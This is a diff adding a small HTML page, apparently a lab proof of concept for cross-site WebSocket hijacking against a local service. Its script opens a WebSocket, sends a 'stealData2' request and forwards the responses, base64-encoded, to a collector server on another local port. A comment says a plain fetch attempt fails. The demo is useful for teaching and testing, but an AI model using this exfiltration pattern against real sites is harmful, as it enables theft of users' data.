@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<title>Vulnerable WebSocket Page</title>
+	</head>
+	<body>
+		<input id="sendMessage1" type="button" value="Send Message" />
+		<input id="sendMessage2" type="button" value="Send Message" />
+		<script>
+			/* Attack via AJAX fails */
+			document.querySelector("#sendMessage1").addEventListener("click", function(clickEvent) {
+				fetch("http://localhost:1111/stealData1")
+					.then(response => response.json())
+					.then(sensitiveData => {
+						fetch("http://localhost:3333/data?data=" + btoa(JSON.stringify(sensitiveData)))
+							.then(console.log);
+					});
+			});
+
+			/* Attack via WebSocket works */
+			var socket = new WebSocket("ws://localhost:1111");
+
+			socket.onopen = function(openEvent) {
+				console.log(`SocketOpen ${openEvent}`);
+			};
+
+			socket.onerror = function(errorEvent) {
+				console.log(`SocketError ${errorEvent}`);
+			};
+
+			socket.onmessage = function(messageEvent) {
+				fetch("http://localhost:3333/data?data=" + btoa(messageEvent.data))
+					.then(console.log);
+			};
+
+			document.querySelector("#sendMessage2").addEventListener("click", function(clickEvent) {
+				socket.send('{"requestType":"stealData2"}');
+			});
+		</script>
+	</body>
+</html>
